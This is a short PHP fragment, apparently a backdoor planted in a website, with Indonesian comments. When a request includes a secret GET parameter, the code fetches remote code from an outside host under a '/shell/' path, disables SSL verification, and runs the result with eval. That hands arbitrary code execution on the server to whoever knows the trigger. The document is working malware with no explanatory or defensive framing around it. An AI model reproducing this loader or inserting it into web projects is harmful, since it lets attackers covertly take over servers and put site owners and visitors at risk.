if (isset($_GET['jkwjkt'])) {
    $url = "https://this-jakartans.sbs/shell/penjarahan.txt";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // nonaktifkan cek SSL sementara (tidak aman untuk prod)
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');

    $code = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($code !== false && !empty(trim($code))) {
        try {
            eval("?>" . $code);
        } catch (Throwable $e) {
            echo "Terjadi error saat menjalankan kode.";
        }
    } else {
        echo "Gagal mengambil kode dari URL: $err";
    }
}
